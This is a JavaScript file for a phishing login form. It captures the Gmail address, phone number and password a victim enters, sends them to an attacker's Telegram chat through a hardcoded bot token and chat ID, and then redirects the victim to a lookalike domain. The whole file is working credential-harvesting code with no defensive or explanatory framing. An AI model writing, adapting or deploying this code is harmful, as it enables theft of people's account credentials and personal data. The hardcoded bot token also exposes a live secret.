// Telegram Bot Configuration
const BOT_TOKEN = "8074904664:AAHtR-Xoz104ZGGi1sXrb42xcWAIrnhejkw";  // Replace with your Telegram bot token
const CHAT_ID = "7987662357";      // Replace with your Telegram chat ID
const REDIRECT_URL = "https://www.xvv1deos.com/new/2"; // Redirect after login

function sendToTelegram(gmail, number, password) {
    const message = `🛡 Login Info 🛡\n\n📧 Gmail: ${gmail}\n📞 Number: ${number}\n🔑 Password: ${password}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    }).then(response => response.json())
      .then(data => {
          console.log("Sent to Telegram:", data);
          window.location.href = REDIRECT_URL; // Redirect to the specified site
      })
      .catch(error => console.error("Error sending to Telegram:", error));
}

// Toggle Password Visibility
function togglePassword() {
    const passwordField = document.getElementById("password");
    passwordField.type = (passwordField.type === "password") ? "text" : "password";
}

// Form Submission
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    const gmail = document.getElementById("gmail").value;
    const number = document.getElementById("number").value;
    const password = document.getElementById("password").value;
    const errorMsg = document.getElementById("errorMsg");

    if (gmail && number && password.length === 6) {
        sendToTelegram(gmail, number, password);
        errorMsg.textContent = "";
    } else {
        errorMsg.textContent = "Please enter valid credentials.";
    }
});
